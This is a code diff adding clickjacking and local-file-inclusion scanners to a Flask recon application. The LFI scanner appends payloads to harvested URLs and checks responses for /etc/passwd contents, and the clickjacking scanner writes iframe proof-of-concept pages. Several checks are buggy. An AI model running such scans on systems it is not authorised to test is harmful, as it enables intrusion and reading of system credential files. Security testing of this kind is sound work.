@@ -7,6 +7,21 @@ from flask import Flask, jsonify, request
 from flask_cors import CORS
 from logging.config import dictConfig
 import asyncio
+from urllib.request import Request, urlopen
+import argparse
+from sys import exit
+import urllib
+import requests
+import urllib.request
+from termcolor import colored
+from urllib.parse import urlparse
+import random
+from time import sleep
+import time
+from selenium import webdriver
+import sys
+from selenium.webdriver.chrome.options import Options
+from selenium.common.exceptions import NoSuchElementException
 
 dictConfig({
     'version': 1,
@@ -168,6 +183,114 @@ def run_bolt(subdomain):
     finally:
         os.chdir(original_cwd)  # Ensure we return to the original directory even if an error occurs
 
+def execute_clickjack():
+    logging.info("Execution started")
+    vuln=False
+    d = open("wayback_urls.txt", 'r')
+    hdr = {'User-Agent': 'Mozilla/5.0'}
+    try:
+        for target in d.readlines():
+            
+            t = target.strip('\n')
+            if (("http") or ("https")) not in t:
+                t = "https://"+t  
+            try:
+                req = Request(t, headers=hdr)
+                data = urlopen(req, timeout=10)
+                filename = urlparse(t).netloc
+                headers = data.info()
+                if not (("X-Frame-Options") or ("x-frame-options")) in headers:
+                    vuln = True
+                    print(colored(f"Target: {t} is Vulnerable", "green"))
+                    print(colored(f"Generating {filename}.html POC File", "yellow"))
+                    poc = """
+                        <html>
+                        <head><title>Clickjack POC page</title></head>
+                        <body>
+                        <p>Website is vulnerable to clickjacking!</p>
+                        <iframe src="{}" width="500" height="500"></iframe>
+                        </body>
+                        </html>
+                        """.format(t)
+                    if ":" in filename:
+                        url = filename.split(':')
+                        filename=url[0]              
+                    with open(filename+".html", "w") as pf:
+                        pf.write(poc)
+                    print(colored(f"Clickjacking POC file Created SuccessFully, Open {filename}.html to get the POC", "blue"))
+                else:
+                    vuln == False
+                    print(colored(f"Target: {t} is not Vulnerable", "red"))
+                    print("Testing Other Url's in the List")
+            except KeyboardInterrupt as k:
+                print("No Worries , I'm here to handle your KeyBoard Interrupts \n")
+            except urllib.error.URLError as e:
+                # handling HTTP 403 Forbidden timeout...
+                print(f"Target {t} has some HTTP Errors via http:// lets let https:// ", exception)
+            except requests.HTTPError as exception:
+                print(f"Target {t} has some HTTP Errors :--> ", exception)
+            except Exception as e:
+                print("Exception Occured with Description ----> ", e)
+                raise("Target Didn't Responsed")
+        print("All Targets Tested Successfully !!")
+    except exception as e:
+        print(e)
+        print("[*] Usage: python3 clickJackPoc.py -f <file_name>")
+        print("[*] The Code might not worked for you , please retry & try --help option to know more")
+        exit(0)
+
+def check_lfi_vulnerability(url):
+    print("Trying payloads list, please wait...")
+    chrome_options = Options()
+    chrome_options.add_argument('--headless')
+    chrome_options.add_argument('--no-sandbox')
+    chrome_options.add_argument('--disable-dev-shm-usage')
+    browser = webdriver.Chrome(options=chrome_options)
+    browser.maximize_window()
+    count = 0
+    vulnerable_urls = []
+    with open("lfi.txt", "r", encoding="UTF-8") as file:
+        payloads = file.readlines()
+        try:
+            while count < len(payloads):
+                target_url = url + payloads[count]
+                browser.get(target_url)
+                print("Testing: "+ payloads[count])
+                time.sleep(random.randint(1, 3))
+                count += 1
+                if "root:x:0:0:root" in browser.page_source:
+                    vulnerable_urls.append(target_url)
+                    print("Vuln Url: " +target_url)
+                if count == len(payloads):
+                    browser.close()
+        except:
+            raise 
+
+    browser.quit()
+    return vulnerable_urls
+
+
+@app.route('/api/lfiFinder', methods=['POST'])
+def run_LFI_Finder():
+    with open("wayback_urls.txt", "r") as f:
+        urls = f.readlines()
+        for url in urls:
+            url=str(url).strip()
+            if url == "":
+                continue
+            elif url[-1] == '/' or url[-1] == '\\':
+                url=url[:-1]
+            print("Checking Vulnerablities for the url: "+url)
+            vulnarablities=check_lfi_vulnerability(url)
+            print("Vulnerable urls are: ")
+            for v in vulnarablities:
+                print(v)
+    return "Thank you"
+
+@app.route('/api/clickjack', methods=['POST'])
+def run_clickjack():
+    execute_clickjack()
+    return "Thank you"
 
 @app.route('/api/subdomains', methods=['POST'])
 def get_subdomains():
